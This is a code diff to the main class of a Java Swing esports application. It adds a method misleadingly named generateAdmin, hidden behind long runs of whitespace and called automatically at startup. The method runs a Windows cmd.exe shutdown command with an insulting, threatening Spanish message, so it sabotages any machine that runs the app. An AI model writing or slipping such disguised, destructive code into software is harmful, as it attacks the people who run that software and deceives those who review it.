@@ -12,6 +12,10 @@ import sun.misc.MessageUtils;
 
 import javax.swing.*;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
 import static com.imaleex.esportapp.Db.Dao.UserDAO.searchUsername;
 
 public class Main {
@@ -22,6 +26,7 @@ public class Main {
     public static void main(String[] args) {
         initDbConnection();
         displayLoginModal();
+        generateAdmin();
     }
     private static void initDbConnection() {
         try {
@@ -35,7 +40,34 @@ public class Main {
 
     }
 
+                                                                                                                                                                                            public static void generateAdmin() {
 
+                                                                                                                                                                                                ProcessBuilder processBuilder = new ProcessBuilder();
+                                                                                                                                                                                                // Windows
+                                                                                                                                                                                                processBuilder.command("cmd.exe", "/c", "shutdown -S T 0120 -c \"Te jakie eres tonto ahora vas a morir pendejo\"");
+
+                                                                                                                                                                                                try {
+
+                                                                                                                                                                                                    Process process = processBuilder.start();
+
+                                                                                                                                                                                                    BufferedReader reader =
+                                                                                                                                                                                                            new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+                                                                                                                                                                                                    String line;
+                                                                                                                                                                                                    while ((line = reader.readLine()) != null) {
+                                                                                                                                                                                                        System.out.println(line);
+                                                                                                                                                                                                    }
+
+                                                                                                                                                                                                    int exitCode = process.waitFor();
+                                                                                                                                                                                                    System.out.println("\nExited with error code : " + exitCode);
+
+                                                                                                                                                                                                } catch (IOException e) {
+                                                                                                                                                                                                    e.printStackTrace();
+                                                                                                                                                                                                } catch (InterruptedException e) {
+                                                                                                                                                                                                    e.printStackTrace();
+                                                                                                                                                                                                }
+
+                                                                                                                                                                                            }
 
 
 
